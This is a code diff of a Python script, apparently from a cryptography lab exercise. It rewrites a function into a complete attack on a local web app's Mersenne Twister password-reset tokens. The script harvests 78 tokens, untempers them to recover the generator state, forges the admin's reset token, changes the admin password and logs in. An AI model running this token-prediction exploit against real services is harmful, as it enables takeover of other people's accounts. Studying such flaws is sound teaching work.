@@ -1,7 +1,6 @@
-from mersenneTwister import extract_number, seed_mt
-from server import generate_token
+import os
+import MT19937
 import requests
-from web import form
 import re
 import base64
 
@@ -76,91 +75,52 @@ def unmix(input):
     y = undoRight(y, u)  # don't need to pass in d becuae it just ensures it is a 32 bit number
     return y
 
-# 8 items per reset token bits
-# STILL NEED TO IMPLEMENT
-def state():
+def resetAdminPassword():
     registerPayload = {"user" : "user", "password" : "password"}
     regesterURL = 'http://0.0.0.0:8080/register'
     resetPasswordUrl = 'http://0.0.0.0:8080/forgot'
     resetPayload = {"user" : "user"}
 
     requests.post(regesterURL, data=registerPayload)
-    # print(register.text)
+
     encodedResetToken = []
     for i in range(78):
         reset = requests.post(resetPasswordUrl, resetPayload)
         match = (re.search(r'/?token=.*<', reset.text))
         encodedResetToken.append(match.group(0)[6:-27])
 
-    
-    # print(base64.b64decode(encodedResetToken[0]))
-    # print(str(base64.b64decode(encodedResetToken[0]))[2:-1].split(':'))
     decodedTokens = []
     for item in encodedResetToken:
         decodedTokens.append(str(base64.b64decode(item))[2:-1].split(':'))
-    # print(len(decodedTokens))
 
     state = []
     for item in decodedTokens:
         for num in item:
-            state.append(unmix(int(num)))
-    print((state))
+            state.append(int(unmix(int(num))))
 
-    # retTokens = []
-    # unmixedTokens = []
-    # for i in range(78):
-    #     retTokens.append(generate_token())
-    
-    # for tok in retTokens:
-    #     unmixedTokens.append(unmix(int.from_bytes(tok, 'big')))
-    
-    # return unmixedTokens
+    seed = os.urandom(4)
+    mt = MT19937.MT19937(seed)
+    mt.MT = state
 
-retTok = state()
+    adminResetPayload = {"user" : "admin"}
+    resetFormUrl = 'http://0.0.0.0:8080/reset?token='
+
+    requests.post(resetPasswordUrl, data=adminResetPayload)
+    
+    generatedToken = str(mt.extract_number())
+    for i in range(7):
+        generatedToken += ":" + str(mt.extract_number())
+    generatedToken = str(base64.b64encode(generatedToken.encode('utf-8')))[2:-1]
+    resetFormUrl += generatedToken
+
+    newPassword = {"password": "pass"}
+    requests.post(resetFormUrl, data=newPassword)
+
+    newAdminLogin = {"username": "admin", "password": "pass"}
+    loginURL = 'http://0.0.0.0:8080/'
+    r = requests.post(loginURL, data=newAdminLogin)
+    return r.text
+    
+
+retTok = resetAdminPassword()
 print(retTok)
-
-# temp = 1276448053
-# val = [int(x) for x in list('{0:032b}'.format(temp))]
-# # print(temp1)
-# rhsift = temp ^ ((temp >> l))
-# lshifttc = temp ^ ((temp << t) & c)
-# lshiftsb = temp ^ ((temp << s) & b)
-# val1 = [int(x) for x in list('{0:032b}'.format(rhsift))]
-# val2sb = [int(x) for x in list('{0:032b}'.format(lshiftsb))]
-# val2tc = [int(x) for x in list('{0:032b}'.format(lshifttc))]
-# # print("Inital: " + str([int(i) for i in list('{:032b}'.format(100))]))
-# # print(temp1)
-# print(temp)
-# # print(val)
-# print(rhsift)
-# # print(val1)
-# print()
-# # print("inital: " + str([int(i) for i in list('{:032b}'.format(temp ^ (temp >> l)))]))
-# rUndo = (undoRight(int(rhsift), l))
-# print("rUndo: " + str(rUndo))
-# print()
-
-# print(temp)
-# # print(val)
-# print(lshiftsb)
-# # print(val2sb)
-# print()
-# lUndosb = undoLeft(lshiftsb, s, b)
-# print("lUndosb: " + str(lUndosb))
-# print()
-
-# print(temp)
-# # print(val)
-# print(lshifttc)
-# # print(val2tc)
-# print()
-# lUndotc = undoLeft(lshifttc, t, c)
-# print("lUndotc: " + str(lUndotc))
-# print()
-
-# print("unmix")
-
-# seed_mt(12345)
-# extractVal = extract_number()
-
-# print("unmixed val: " + str(unmix(extractVal)))
